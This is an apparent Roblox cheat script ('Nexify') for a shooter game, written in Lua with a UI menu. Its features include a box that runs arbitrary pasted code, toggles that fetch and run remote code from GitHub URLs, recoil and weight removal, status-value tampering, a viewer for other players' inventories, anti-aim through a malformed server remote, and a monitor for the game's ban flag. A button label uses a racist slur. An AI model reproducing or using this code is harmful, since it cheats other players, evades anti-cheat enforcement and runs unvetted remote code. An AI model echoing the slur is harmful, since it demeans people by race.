luatab:AddInput('Execute', {
    Default = 'Execute Any Scripts',
    Numeric = false, 
    Finished = true, 

    Text = 'Execute Script',
    Tooltip = 'Execute Any Scripts', 

    Placeholder = 'Execute Any Scripts', 
    

    Callback = function(Value)
        
        if Value and Value ~= "" then
            print('[cb] Executing script:', Value) 
            local success, err = pcall(function()
                loadstring(Value)() 
            end)

            
            if not success then
                print('[cb] Error executing script:', err) 
            end
        else
            print('[cb] No script provided.')
        end
    end
})

luatab:AddLabel("Sigma Or Bigma?")
local set_identity = (type(syn) == 'table' and syn.set_thread_identity) or setidentity or setthreadcontext
luatab:AddLabel("1.2")


print('load_' .. tostring(counter))
counter = counter + 1



local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local zoomValue = 0
local defaultFOV = Camera.FieldOfView
local zoomKey = Enum.KeyCode.Z
local isZoomed = false

 function applyZoom()
    Camera.FieldOfView = defaultFOV - (zoomValue * 10)
end

-- Function to reset FOV
 function resetZoom()
    Camera.FieldOfView = defaultFOV
end

-- Slider for zoom value
Misc:AddSlider('ZoomSlider', {
    Text = 'Zoom Value',
    Default = 8.1,
    Min = 0.1,
    Max = 9,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        zoomValue = Value
    end
})

-- Key picker for zoom toggle key
Misc:AddLabel('Zoom Bind'):AddKeyPicker('ZoomKeyPicker', {
    Default = 'Z',
    SyncToggleState = false,
    Mode = 'Toggle',
    Text = 'Zoom Keybind',
    Callback = function(value)
        print('[cb] Keybind clicked!', value)
    end,
    ChangedCallback = function(newKey)
        zoomKey = newKey
        print('[cb] Keybind changed!', newKey)
    end
})

-- Function to handle key press
local function onKeyPress(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == zoomKey then
        isZoomed = not isZoomed -- Toggle zoom state
        if not isZoomed then
            resetZoom() -- Reset zoom if untoggled
        end
    end
end

-- Continuously apply zoom while toggled
RunService.RenderStepped:Connect(function()
    if isZoomed then
        applyZoom()
    end
end)

-- Connect input events
UserInputService.InputBegan:Connect(onKeyPress)


print('load_' .. tostring(counter))
counter = counter + 1

print('load_' .. tostring(counter))
counter = counter + 1
print('load_' .. tostring(counter))
counter = counter + 1



WorldTab:AddButton('Delete Solters Anti Cheat', function()



		
 end)

Misc:AddSlider('fpslimiter', {
    Text = 'FPS Limiter',
    Default = 120,
    Min = 10,
    Max = 500,
    Rounding = 3,
    Compact = true,
}):OnChanged(function(State)
    setfpscap(State)
end)

Misc:AddToggle('Refresh Silent Aim', {
    Text = 'Refresh Silent Aim Module',
    Default = true,
    Risky = true,
    Callback = function(isEnabled)
        


    end
})


Misc:AddSlider('Silentdsfwesgerdsf', {
    Text = 'Silent Aim Refresh Module Refresh Rate',
    Default = 4, 
    Min = 0.2, 
    Max = 15, 
    Rounding = 2, 
    Compact = false,
}):OnChanged(function(value)



end)

Misc:AddButton('Rejoin⚡', function()
    if #plrs:GetPlayers() <= 1 then
        plrs.LocalPlayer:Kick("\nrejoining⚡")
        wait(3)
        game:GetService("TeleportService"):Teleport(game.PlaceId, plrs.LocalPlayer)
    else
    plrs.LocalPlayer:Kick("\nrejoining⚡")
    wait(3)
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plrs.LocalPlayer)
    end
end)



local function toggleThirdPerson(enable)
    if enable then
        
        player.CameraMode = Enum.CameraMode.Classic
        player.CameraMaxZoomDistance = 10
        player.CameraMinZoomDistance = 10
        camera.CameraType = Enum.CameraType.Custom
        camera.CameraSubject = player.Character:FindFirstChild("Humanoid")
    else
        
        player.CameraMode = Enum.CameraMode.LockFirstPerson
        camera.CameraType = Enum.CameraType.Custom
        camera.CameraSubject = nil  
    end
end


movetab:AddToggle('Third Person', {
    Text = 'Third Person',
    Default = false,

    Callback = function(isEnabled)
        if isEnabled then
            print("called")
            
            loadstring(game:HttpGet("https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/thirdpe.lua"))()
        else
        print("called2")
            
            loadstring(game:HttpGet("https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/thirdsianle.lua"))()
        end
    end


}):AddKeyPicker('thirdpersonkeybind', {
    Default = 'None',
    SyncToggleState = true,

    Mode = 'Toggle',

    Text = 'Third Person Keybind',
    NoUI = false,

    Callback = function(Value)
    end,
})


movetab:AddToggle('Server Info', {
    Text = 'Server Info',
    Default = true,
    Callback = function(value)
        local player = game.Players.LocalPlayer 
        if player and player:FindFirstChild("PlayerGui") then 
            local serverInfo = player.PlayerGui:FindFirstChild("ServerInfo") 
            if serverInfo then
                serverInfo.Enabled = value 
            else
                warn("ServerInfo GUI not found in PlayerGui") 
            end
        else
            warn("PlayerGui not found for LocalPlayer") 
        end
    end
})



movetab:AddToggle('Menu Blur', {
    Text = 'Menu Blur',
    Default = true,
    Callback = function(value)

game.Lighting.InventoryBlur.Enabled = value

    end
})


print('Fuckers_' .. tostring(counter))
counter = counter + 2




print('load_' .. tostring(counter))
counter = counter + 1

print('load_' .. tostring(counter))
counter = counter + 1



print('load_' .. tostring(counter))
counter = counter + 1
local pdeltatabbox = Tabs.Main:AddLeftTabbox("Project Delta Nexify")
local pdeltatabbox1 = Tabs.Main:AddRightTabbox("Project Delta Nexify")
local aimtab = pdeltatabbox:AddTab("Combat Features")



print('suckerloaders_' .. tostring(counter))
counter = counter + 4



aimtab:AddLabel("Nexify V1.8 Solara", true)

aimtab:AddToggle('nograss', {
    Text = 'No Grass',
    Default = false,
    Tooltip = 'Removes Grasses',
    Callback = function(first)
        sethiddenproperty(game:GetService("Workspace").Terrain, "Decoration", not first)
    end
})



local LC = Game.Players.LocalPlayer  
local rp = game:GetService("ReplicatedStorage")
local skins = {
	["762x25MAG"] = "Nutcracker",
	["762x25Rnd71Mag"] = "Arctic",
	["762x25TTMAG"] = "Watergun",
	["762x39MAG"] = "DeltaAnime",
	["762x39Rnd75Mag"] = "Anton",
	["762x54Rnd10Mag"] = "Permafrost",
	["9x18vzMag"] = "GiftWrap",
	["9x19MP443MAG"] = "JollyRoger",
	["9x19MP5MAG"] = "Permafrost",
	["9x39Mag"] = "Shoreline",
	AKMN = "DeltaAnime",
	FrontAKMN = "DeltaAnime",
	HandleRK3AKMN = "DeltaAnime",
	PolymerStockAKMN = "DeltaAnime",
	HandleAKMN = "Valentine",
    Tortilla = "Blackout",
	DV2 = "Cutlass",
    ["DV-2"] = "Cutlass",
    ["DV-2 Knife"] = "Cutlass",
	TacticalFrontAKMN = "AnodizedRed",
	SvdFront = "Permafrost",
	MuzzleBrakeAKM = "AnodizedRed",
	CombatGloves = "Anarchy",
	CamoShirt = "Anarchy",
	HandWraps = "SantaCommando",
	WastelandShirt = "SantaCommando",
	M4 = "Devil",
	Lighter = "EarlyAccess",
	GorkaShirt = "Wetsuit",
	GhillieTorso = "Arctic",
	AsVal = "Shoreline",
	F1 = "Pineapple",
	Makarov = "Serpant",
	Mosin = "SkullHunter",
	PPSH41 = "Nutcracker",
	SVD = "Permafrost",
	Saiga12 = "Valentine",
	TT33 = "Watergun",
	ZSh = "Woodland",
	MP5SD  = "Permafrost",
	MP443 = "Whiteout",
	IZh81 = "Watergun",
}
  



Misc:AddToggle('antiaim', {
    Text = 'Tilt Manuplation',
    Risky = true,
    Default = false,

    Callback = function(first)
        game.ReplicatedStorage.Remotes.UpdateTilt:FireServer(first and 0 / 0 or 0)
    end
})



movetab:AddToggle('nosunray', {
    Text = 'No Sun Rays',
    Default = false,

    Callback = function(first)
        if first then
            game.Lighting.SunRays.Enabled = false
        else
            game.Lighting.SunRays.Enabled = true
        end
    end
})

movetab:AddToggle('nohurteffect', {
    Text = 'No Hurt Effect',
    Default = false,

    Callback = function(first)
        if first then
            game.Lighting.HurtEffect.Enabled = false
        else
            game.Lighting.HurtEffect.Enabled = true
        end
    end
})


aimtab:AddButton('Skin Changer', function()

if rp:FindFirstChild("Players") then
    local playersContainer = rp.Players
    local player = playersContainer:FindFirstChild(LC.Name)
    
    if player then
        for _, item in player:GetDescendants() do
            local itemProperties = item:FindFirstChild("ItemProperties")
            if itemProperties and skins[item.Name] then
                itemProperties:SetAttribute("Skin", skins[item.Name])
            end
        end
    end
end


 end)


aimtab:AddDropdown('DV2SKin', {
    Values = {'Longsword', 'PlasmaNinjato','Cutlass'},
    Default = 3,
    Multi = false,
    Text = 'Knife Skin Selector',
    Tooltip = 'Knife Skin Selector',
    Callback = function(state)





local localPlayer = game.Players.LocalPlayer
if not localPlayer then
    warn("LocalPlayer is not available!")
    return
end

local DV2 = game.ReplicatedStorage.ViewModels:FindFirstChild("DV2")
local Karambit = game.ReplicatedStorage.ViewModels:FindFirstChild(state)
if DV2 and Karambit then
    DV2.Name = "DV2real"
    Karambit.Name = "DV2"
end


local skins = skins or {}  


if game.ReplicatedStorage:FindFirstChild("Players") and game.ReplicatedStorage.Players:FindFirstChild(localPlayer.Name) then
    local plr = game.ReplicatedStorage.Players:FindFirstChild(localPlayer.Name)
    
    if plr then
        
        for i, v in pairs(plr:GetDescendants()) do
            
            if v:FindFirstChild("ItemProperties") and skins[v.Name] then
                v.ItemProperties:SetAttribute("Skin", skins[v.Name])
            end
        end
    else
        warn("Player not found in ReplicatedStorage")
    end
else
    warn("Players or localPlayer not found in ReplicatedStorage")
end






    end
})

WorldTab:AddButton('Remove SFX', function()

game.ReplicatedStorage.SFX:Destroy()

 end)

WorldTab:AddButton('Remove VFX', function()

game.ReplicatedStorage.VFX:Destroy()

 end)


local Workspace = game:GetService("Workspace")



local speedMultiplier = 1 
local viewModel = nil
local animator = nil
local monitoring = true 


local function changeAnimationSpeed(multiplier)
    if animator then
        for _, animTrack in pairs(animator:GetPlayingAnimationTracks()) do
            animTrack:AdjustSpeed(multiplier)
        end
    end
end


local function setupAnimator()
    viewModel = Workspace:FindFirstChild("Camera") and Workspace.Camera:FindFirstChild("ViewModel")
    if viewModel then
        local humanoid = viewModel:FindFirstChild("Humanoid")
        if humanoid then
            animator = humanoid:FindFirstChildOfClass("Animator")
            if animator then
                
                changeAnimationSpeed(speedMultiplier)
                
                
                animator.AnimationPlayed:Connect(function(animTrack)
                    animTrack:AdjustSpeed(speedMultiplier)
                end)
                
                return true
            else
                warn("Animator not found in Humanoid")
            end
        else
            warn("Humanoid not found in ViewModel")
        end
    else
        
    end
    return false
end


local function monitorViewModel()
    while monitoring do
        local hasViewModel = setupAnimator()

        if not hasViewModel then
            animator = nil
            viewModel = nil
        end

        wait(0.1) 
    end
end


local function toggleAnimationSpeed(enable)
    if enable and animator then
        
        changeAnimationSpeed(speedMultiplier)
    else
        
        print("Animation speed adjustment disabled.")
    end
end

 LogService = game:GetService("LogService")


LogService.MessageOut:Connect(function(message, messageType)
    if messageType == Enum.MessageType.MessageError then
        warn("[Suppressed Error]: Notificated")
        print("error incoming...")

	--[[

                        Notification:Notify(
            {Title = "Nexify | Solara", Description = "ERROR HAPPENED PLEASE REPORT IN A TICKET DETAILS:\n" ..message},
            {OutlineColor = Color3.fromRGB(255, 3, 3), Time = 60, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )
	--]]
    end
	
end)


warn("Suspender Activated.")


local function setSpeedMultiplier(value)
    speedMultiplier = value
    toggleAnimationSpeed(true) 
end

local Lighting = game:GetService("Lighting") 
local fullBrightActive = false 
local oldSettings = {} 

local function enableFullBright()
    
    if not oldSettings.Ambient then
        oldSettings.Ambient = Lighting.Ambient
        oldSettings.Brightness = Lighting.Brightness
        oldSettings.ShadowSoftness = Lighting.ShadowSoftness
        oldSettings.GlobalShadows = Lighting.GlobalShadows
    end

    
    Lighting.Ambient = Color3.fromRGB(255, 255, 255)
    Lighting.Brightness = 2 
    Lighting.GlobalShadows = false 
    Lighting.ShadowSoftness = 0 
end

local function disableFullBright()
    
    Lighting.Ambient = oldSettings.Ambient or Lighting.Ambient
    Lighting.Brightness = oldSettings.Brightness or Lighting.Brightness
    Lighting.GlobalShadows = oldSettings.GlobalShadows ~= nil and oldSettings.GlobalShadows or Lighting.GlobalShadows
    Lighting.ShadowSoftness = oldSettings.ShadowSoftness or Lighting.ShadowSoftness
end


Misc:AddToggle('fullBrightToggle', {
    Text = 'Enable Full Bright',
    Default = false,
    Callback = function(state)
        fullBrightActive = state
        if fullBrightActive then
            enableFullBright() 
        else
            disableFullBright() 
        end
    end
})


movetab:AddToggle('noglobshadow', {
    Text = 'No Global Shadows',
    Default = false,
    Callback = function(state)
        noglobshadowactive = state
        if noglobshadowactive then
            game.Lighting.GlobalShadows = false 
        else
            game.Lighting.GlobalShadows = true
        end
    end
})

aimtab:AddToggle('nowaterblur', {
    Text = 'No Water Blur',
    Tooltip = 'No Blur For Water',
    Default = false, 
    Callback = function(enabled)
        if enabled then
        library:Notify("Enabled No Water Blur", 10)
            game.Lighting.WaterBlur.Size = 0 
        else
        library:Notify("Disabled No Water Blur", 10)
            game.Lighting.WaterBlur.Size = 24 
        end
    end
})



	
movetab:AddDropdown('FunctionMode', {
    Values = {'AUTOMATIC', 'V1🔴', 'V2🟡', 'V3🟡', 'V4🔴', 'V5🟢', 'V5 TURBO🟢', 'V6🟢', 'V6 TURBO🟢', 'V7🟡', 'V7 TURBO MAX🟡', 'V7 TURBO🟢', 'V8 TURBO MAX🟢'},
    Default = 9,
    Multi = false,
    Text = 'Function Mode ⚠️',
    Tooltip = 'Function Mode ⚠️ (NOT RECOMMENDED TO CHANGE)',
    Callback = function(state)
                
        setfpscap(0)  

        
        wait(1.9)

        
        setfpscap(9000)  
    end
})

aimtab:AddToggle('removevisors', {
    Text = 'Remove Visors',
    Default = false,
    Callback = function(state)  
        if state then
            game.Players.LocalPlayer.PlayerGui.MainGui.MainFrame.ScreenEffects.Visible = false
        else
            game.Players.LocalPlayer.PlayerGui.MainGui.MainFrame.ScreenEffects.Visible = true
        end
    end
})

aimtab:AddToggle('removeflashbangs', {
    Text = 'Remove Flash Effect',
    Default = false,
    Callback = function(state)  
        if state then
            game.Players.Player.PlayerGui.MainGui.MainFrame.ScreenEffects.Flashbang.Size = UDim2.new(0,0,1,0)
        else
                    game.Players.Player.PlayerGui.MainGui.MainFrame.ScreenEffects.Flashbang.Size = UDim2.new(1,0,1,0)
        end
    end
})




aimtab:AddToggle('Instantequip', {
    Text = 'Instant Equip',
    Tooltip = 'Instant Equip',
    Default = false,
    
    Callback = function(isToggled)
        if isToggled then
            
            setSpeedMultiplier(7)
        else
            
            setSpeedMultiplier(1)
        end
    end
})


coroutine.wrap(monitorViewModel)()

local function nostalgiaModePd(enabled)
    if enabled then
        game.Lighting.Brightness = 14
        game.Lighting.GlobalShadows = false
        game.Lighting.Technology = Enum.Technology.Compatibility
    else
        game.Lighting.Brightness = 1
        game.Lighting.GlobalShadows = true
        game.Lighting.Technology = Enum.Technology.Future
    end
end

aimtab:AddToggle('NostalgiaMode', {
    Text = 'Old Times Mode',
    Tooltip = 'Old Times Mode',
    Default = false,

    Callback = function(enabled)
        if enabled then
            nostalgiaModePd(true)
        else
            nostalgiaModePd(false)
        end
    end
})

local function printFolderNames(parent)
    for _, child in ipairs(parent:GetChildren()) do
        if child:IsA("Folder") then
            print(child.Name)
        end
    end
end


 player = game.Players.LocalPlayer
 mouse = player:GetMouse()
 ReplicatedStorage = game:GetService("ReplicatedStorage")
 RunService = game:GetService("RunService")
UserInputService = game:GetService("UserInputService")  


screenGui = Instance.new("ScreenGui")
screenGui.Parent = player.PlayerGui

 frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 300)  
frame.Position = UDim2.new(0, 45, 0, 10)  
frame.BackgroundTransparency = 1
frame.Visible = false  
frame.Parent = screenGui

 textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.Position = UDim2.new(0, 0, 0, 0)
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  
textLabel.TextSize = 14  
textLabel.Font = Enum.Font.Code  
textLabel.BackgroundTransparency = 1
textLabel.Text = "=== Inventory Viewer ==="
textLabel.Parent = frame


 isInventoryViewerActive = false


function getClosestPlayer()
    local closestPlayer = nil
    local shortestDistance = math.huge

    for _, plr in pairs(game.Players:GetPlayers()) do
        if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local distance = (plr.Character.HumanoidRootPart.Position - mouse.Hit.p).Magnitude
            if distance < shortestDistance then
                closestPlayer = plr
                shortestDistance = distance
            end
        end
    end

    return closestPlayer
end


function updateInventoryDisplay(playerName)
    local closestPlayer = game.Players:FindFirstChild(playerName)
    if closestPlayer and closestPlayer.Character then
        local inventory = ReplicatedStorage.Players:FindFirstChild(closestPlayer.Name).Inventory
        local clothing = ReplicatedStorage.Players:FindFirstChild(closestPlayer.Name).Clothing

        if inventory or clothing then
            local inventoryText = "=== Inventory Viewer ===\n" .. closestPlayer.Name .. "'s Inventory\n\n"
            local itemsFound = false

            
            if inventory then
                inventoryText = inventoryText .. "Inventory:\n"
                for _, itemName in pairs(inventory:GetChildren()) do
                    if itemName:IsA("StringValue") then
                        inventoryText = inventoryText .. itemName.Name .. "\n"
                        itemsFound = true
                    end
                end
            end

            
            if clothing then
                inventoryText = inventoryText .. "\nClothing:\n\n"
                for _, clothingItem in pairs(clothing:GetChildren()) do
                    if clothingItem:IsA("StringValue") then
                        inventoryText = inventoryText .. clothingItem.Name .. "\n"
                        itemsFound = true
                    end
                end
            end

            
            if not itemsFound then
                inventoryText = inventoryText .. "Empty"
            end

            textLabel.Text = inventoryText
        else
            textLabel.Text = "No inventory or clothing found."
        end
    else
        textLabel.Text = "No player found."
    end
end


function toggleInventoryViewer()
    isInventoryViewerActive = not isInventoryViewerActive
    frame.Visible = isInventoryViewerActive  
end




RunService.Heartbeat:Connect(function()
    if isInventoryViewerActive then
        local closestPlayer = getClosestPlayer()
        if closestPlayer then
            
            updateInventoryDisplay(closestPlayer.Name)
        else
            
            textLabel.Text = "No player found."
        end
    end
end)





local directory = game.ReplicatedStorage.Clans 

movetab:AddButton('Nigga Whisper', function()

    
    game.ReplicatedStorage.AiPresets.WhisperAI.Pants:Destroy()
    game.ReplicatedStorage.AiPresets.WhisperAI.Shirt:Destroy()
    
    
    local bodyColors = game.ReplicatedStorage.AiPresets.WhisperAI["Body Colors"]
    
    
    local function setDarkColors()
        
        if bodyColors and bodyColors:IsA("BodyColors") then
            
            bodyColors.HeadColor = BrickColor.new("Black")
            bodyColors.LeftArmColor = BrickColor.new("Black")
            bodyColors.LeftLegColor = BrickColor.new("Black")
            bodyColors.RightArmColor = BrickColor.new("Black")
            bodyColors.RightLegColor = BrickColor.new("Black")
            bodyColors.TorsoColor = BrickColor.new("Black")
        else
            warn("BodyColors instance not found or invalid.")
        end
    end
    
    
    setDarkColors()

end)

aimtab:AddButton('Destroy Look At (Whisper)', function()

game.ReplicatedStorage.AiPresets.WhisperAI.LookAt:Destroy()


 end)

movetab:AddButton('Naked Whisper', function()

game.ReplicatedStorage.AiPresets.WhisperAI.Pants:Destroy()
game.ReplicatedStorage.AiPresets.WhisperAI.Shirt:Destroy()

 end)

movetab:AddButton('Print All Clan Names', function()

printFolderNames(directory)

 end)

aimtab:AddButton('Destroy Drown Remote', function()

game.StarterPlayer.StarterCharacterScripts.Health.Drowning:Destroy()

 end)

movetab:AddButton('Destroy Buildables', function()

game.ReplicatedStorage.Buildable:Destroy()

 end)

 --[[

aimtab:AddToggle('Aimbot', {
    Text = 'Aim Bot',
    Tooltip = 'Locks To Head Or Torso',
    Default = false,

    Callback = function(first)
        toggleAimbot()
    end



    }):AddKeyPicker('aimbotkeybind', {
    Default = 'None',
    SyncToggleState = true,

    Mode = 'Toggle',

    Text = 'Aimbot Key Bind',
    NoUI = false,

    Callback = function(Value)
    end,
})

--]]
local HitmarkerSounds = {
    ["TF2"]       = "rbxassetid://8255306220",
    ["Gamesense"] = "rbxassetid://4817809188",
    ["Rust"]      = "rbxassetid://1255040462",
    ["Neverlose"] = "rbxassetid://8726881116",
    ["Bubble"]    = "rbxassetid://198598793",
    ["Quake"]     = "rbxassetid://1455817260",
    ["Among-Us"]  = "rbxassetid://7227567562",
    ["Ding"]      = "rbxassetid://2868331684",
    ["Minecraft"] = "rbxassetid://6361963422",
    ["Blackout"]  = "rbxassetid://3748776946",
    ["Osu!"]      = "rbxassetid://7151989073",
}


aimtab:AddDropdown('cameradropdown', {
    Values = { 'TF2', 'Gamesense', 'Rust', 'Neverlose', 'Bubble', 'Quake', 'Among-Us', 'Ding', 'Minecraft', 'Blackout', 'Osu!' },  
    Default = 3,  
    Multi = false,
    Text = 'Hit Sounds', 
    Tooltip = 'Hit Sounds', 
    Callback = function(state)
        
        local globalhitsounds = HitmarkerSounds[state]
        
        
        if globalhitsounds then
            local SFXDIRECTORY = game.ReplicatedStorage.SFX

            
            SFXDIRECTORY.Hits.MeleeHits.Blood.Hit.SoundId = globalhitsounds
            SFXDIRECTORY.Hits.ProjectileHits.Blood.Hit.SoundId = globalhitsounds
            SFXDIRECTORY.Hits.HitMarkers.Helmet.SoundId = globalhitsounds
            SFXDIRECTORY.Hits.HitMarkers.Bodyshot.SoundId = globalhitsounds
            SFXDIRECTORY.Hits.HitMarkers.Headshot.SoundId = globalhitsounds
				
	    SFXDIRECTORY.Hits.MeleeHits.Blood.Hit.Volume = 10
            SFXDIRECTORY.Hits.ProjectileHits.Blood.Hit.Volume = 10
            SFXDIRECTORY.Hits.HitMarkers.Helmet.Volume = 10
            SFXDIRECTORY.Hits.HitMarkers.Bodyshot.Volume = 10
            SFXDIRECTORY.Hits.HitMarkers.Headshot.Volume = 10
        else
            warn("Selected hit sound is not available!")
        end
    end
})

aimtab:AddButton('No Gun Weight', function()

local playerName = game.Players.LocalPlayer.Name


local playerInventory = game.ReplicatedStorage.Players[playerName].Inventory




for _, item in pairs(playerInventory:GetChildren()) do
    if item:FindFirstChild("ItemProperties") and item.ItemProperties:FindFirstChild("Tool") then
        item.ItemProperties.Tool:SetAttribute("MovementModifer", "0")
    end
end


 end)

Misc:AddSlider('hydration', {
    Text = 'Hydration Slider',
    Default = 3700,
    Min = 0,
    Max = 3700,
    Rounding = 3,
    Compact = true,
}):OnChanged(function(state)
    local playerName = game.Players.LocalPlayer.Name


local playerInventory = game.ReplicatedStorage.Players[playerName].Status.GameplayVariables


playerInventory.Hydration:SetAttribute("Value", state)
end)

Misc:AddSlider('radiationslider', {
    Text = 'Radiation Slider',
    Default = 0,
    Min = 0,
    Max = 800,
    Rounding = 3,
    Compact = true,
}):OnChanged(function(state)
    local playerName = game.Players.LocalPlayer.Name


local playerInventory = game.ReplicatedStorage.Players[playerName].Status.GameplayVariables


playerInventory.Radiation:SetAttribute("Value", state)
end)


Misc:AddSlider('legfracture', {
    Text = 'Leg Fracture Slider',
    Default = 0,
    Min = 0,
    Max = 30,
    Rounding = 1,
    Compact = true,
}):OnChanged(function(state)
    local playerName = game.Players.LocalPlayer.Name


local playerInventory = game.ReplicatedStorage.Players[playerName].Status.GameplayVariables


playerInventory.LegFracture:SetAttribute("Value", state)
end)


Misc:AddSlider('Bleeding', {
    Text = 'Bleeding Slider',
    Default = 0,
    Min = 0,
    Max = 70,
    Rounding = 1,
    Compact = true,
}):OnChanged(function(state)
    local playerName = game.Players.LocalPlayer.Name


local playerInventory = game.ReplicatedStorage.Players[playerName].Status.GameplayVariables


playerInventory.Bleeding:SetAttribute("Value", state)
end)


Misc:AddSlider('hunger', {
    Text = 'Hunger Slider',
    Default = 2000,
    Min = 0,
    Max = 2000,
    Rounding = 3,
    Compact = true,
}):OnChanged(function(state)
    local playerName = game.Players.LocalPlayer.Name


local playerInventory = game.ReplicatedStorage.Players[playerName].Status.GameplayVariables


playerInventory.Hunger:SetAttribute("Value", state)
end)


Misc:AddDropdown('raritychanger', {
    Values = { 'Epic', 'Common', 'Legendary', 'Mythical' },
    Default = 1,
    Multi = false,
    Text = 'Rarity Changer',
    Tooltip = 'Works For All Guns!',
    Callback = function(state)
       
local playerName = game.Players.LocalPlayer.Name


local playerInventory = game.ReplicatedStorage.Players[playerName].Inventory


for _, item in pairs(playerInventory:GetChildren()) do

    if item:FindFirstChild("ItemProperties") then

        item.ItemProperties:SetAttribute("Rarity", state)
    end
end



    end
})

movetab:AddDropdown('cameradropdown', {
    Values = { 'Attach', 'Custom', 'Fixed', 'Follow', 'Orbital', 'Scriptable', 'Track', 'Watch'},
    Default = 2,
    Multi = false,
    Text = 'Camera Type',
    Tooltip = 'Camera Type',
    Callback = function(state)
        game.workspace.Camera.CameraType = state 
    end
})

aimtab:AddDropdown('aimbottargetpart', {
    Values = { 'HumanoidRootPart', 'Head' },
    Default = 2,
    Multi = false,
    Text = 'Aimbot Target Part',
    Tooltip = 'Select a part for targeting (Aimbot)',
    Callback = function(Value)
        targetPart = Value 
    end
})



local function norecoil()

for i,v in pairs(ammo:GetChildren()) do
     v:SetAttribute("RecoilStrength", "0")
end

end

--[[

aimtab:AddToggle('InstantHit', {
    Text = 'Instant Hit',
    Tooltip = 'Instant Hit',
    Default = false,

    Callback = function(enabled)
        
        local ammo = game.ReplicatedStorage:FindFirstChild("AmmoTypes")
        if ammo then
            
            for _, v in pairs(ammo:GetChildren()) do
                
                if enabled then
                    v:SetAttribute("MuzzleVelocity", 2900)
                else
                    v:SetAttribute("MuzzleVelocity", 2800) 
                end
            end
        end
    end
})


--]]


aimtab:AddSlider('RecoilStrength', {
    Text = 'Recoil Slider',
    Default = 230,
    Min = 0,
    Max = 300,
    Rounding = 0,
    Compact = false,
}):OnChanged(function(State)
    
    if State == 0 then
        
        for i, v in pairs(ammo:GetChildren()) do
            v:SetAttribute("RecoilStrength", "0")
        end
    else
        
        for i, v in pairs(ammo:GetChildren()) do
            v:SetAttribute("RecoilStrength", State)
        end
    end
end)


 Players = game:GetService("Players")
 RunService = game:GetService("RunService")
 UserInputService = game:GetService("UserInputService")
 Workspace = game:GetService("Workspace")


 watchingPlayerName = "nobody"
 isWatching = false
 watchConnection = nil
 draggableCamera = false


 function getPlayerNames()
    local names = {"nobody"} 
    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(names, player.Name)
    end
    return names
end


 function startWatching(playerName)
    if playerName == "nobody" then
        return
    end

    local targetPlayer = Players:FindFirstChild(playerName)
    if not targetPlayer then
        warn("Player not found: " .. playerName)
        return
    end

    local targetCharacter = targetPlayer.Character
    if not targetCharacter then
        warn("Target player's character not found.")
        return
    end

    local targetHumanoidRootPart = targetCharacter:WaitForChild("HumanoidRootPart")
    isWatching = true
    Workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable

    watchConnection = RunService.RenderStepped:Connect(function()
        if targetHumanoidRootPart and isWatching and not draggableCamera then
            Workspace.CurrentCamera.CFrame = CFrame.new(targetHumanoidRootPart.Position + Vector3.new(0, 10, -10), targetHumanoidRootPart.Position)
        end
    end)
end


 function stopWatching()
    if isWatching then
        isWatching = false
        draggableCamera = false
        if watchConnection then
            watchConnection:Disconnect()
            watchConnection = nil
        end
        Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom 
    end
end


 function refreshDropdown(dropdown)
    dropdown:Update({
        Values = getPlayerNames(),
    })
end


movetab:AddDropdown('Player Watcher', {
    Values = getPlayerNames(),
    Default = 1,
    Multi = false,
    Text = 'Player Watcher',
    Tooltip = 'Press B to Unwatch',
    Callback = function(state)
        watchingPlayerName = state
        stopWatching() 
        if state ~= "nobody" then
            startWatching(state)
        end
    end
})


UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then
        return
    end

    
    if isWatching and (input.UserInputType == Enum.UserInputType.MouseButton2) then
        draggableCamera = true
        Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
    elseif isWatching and input.KeyCode == Enum.KeyCode.B then
        stopWatching()
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if gameProcessed then
        return
    end

    
    if isWatching and (input.UserInputType == Enum.UserInputType.MouseButton2) then
        draggableCamera = false
        Workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
    end
end)

--[[
Players.PlayerAdded:Connect(function()
    refreshDropdown(movetab.Dropdown.PlayerWatcher)
end)

Players.PlayerRemoving:Connect(function()
    refreshDropdown(movetab.Dropdown.PlayerWatcher)
end)
--]]


local function predict_drop(part, entity, projectile_speed, projectile_drop)
    local distance = (trident.middlepart.Position - part.Position).Magnitude
    local time_to_hit = distance / projectile_speed

    
    local final_projectile_speed = projectile_speed  

    
    local drop_timing = projectile_drop * time_to_hit

    
    if drop_timing ~= drop_timing then  
        return 0
    end

    return drop_timing
end


aimtab:AddButton('Drop Prediction', function()

predict_drop()

end)


aimtab:AddLabel("Default Is 0.118", true)


aimtab:AddSlider('Predictionslider', {
    Text = 'Prediction Slider',
    Default = 0.118,
    Min = 0.1,
    Max = 0.340,
    Rounding = 3,
    Compact = true,
}):OnChanged(function(state)
    if type(state) == "number" then
        predictionFactor = state
        print("Prediction factor updated to:", predictionFactor)
    else
        warn("Slider state is not a number:", state)
    end
end)




local materials = {}
for _, material in ipairs(Enum.Material:GetEnumItems()) do
    table.insert(materials, material.Name)
end


local function detectBan()
    while true do
        wait(3) 

        
        local playerStatus = game.ReplicatedStorage.Players:FindFirstChild(Game.Players.LocalPlayer.Name)
        
        if playerStatus and playerStatus:FindFirstChild("Status") and playerStatus.Status:FindFirstChild("UAC") then
            
            local beingBanned = playerStatus.Status.UAC:GetAttribute("BeingBanned")
            
            
            if beingBanned == true then
                print("You are being banned!")
                library:Notify("[UAC] YOU ARE GOING TO GET BANNED.", 25)
            end
        else
        library:Notify("[UAC] UAC VARIABLE ERROR.",15)
            warn("Could not find the UAC status for the player.")
        end
    end
end


coroutine.wrap(detectBan)()
